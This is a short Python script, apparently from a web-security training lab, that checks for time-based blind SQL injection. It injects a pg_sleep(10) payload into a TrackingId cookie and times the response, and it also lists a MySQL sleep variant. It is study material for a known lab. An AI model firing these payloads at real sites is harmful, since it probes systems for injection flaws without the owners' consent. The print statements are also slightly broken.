# Blind SQL injection with time delays
"""
    TrackingId = x ' || (SELECT sleep(10)) --'    -> X mySQL 
    TrackingId = x ' || (SELECT pg_sleep(10)) --'  -> Postgres
"""
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import urllib

proxies = {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080' }

# url = 'https://0a8800a8044a76b684e00e2000a8004d.web-security-academy.net/'

def blind_sqli_check(url):
    sqli_payload = "' || (SELECT pg_sleep(10)) --"
    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
    cookies = {
        'TrackingId': 'qt5tXolxDkAmj8Nf' + sqli_payload_encoded,
        'session': 'ulXeEn3knzIiT1091cBKg1XgH3cTsd9v' 
    }
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    if int(r.elapsed.total_seconds())  > 10:
        print("(+) time %s Vulerable to blind-based sqli ", r.elapsed.total_seconds())
    else:
        print("(+) time %s Not vulerable to blind-based sqli ", r.elapsed.total_seconds())           

def main(): 
    if len(sys.argv) != 2:
        print ("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print ('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    print("[+] Checking if checking cookie is vulnerable to time-based blind SQLi")
    blind_sqli_check(url)
    
if __name__ == '__main__':
    main()
    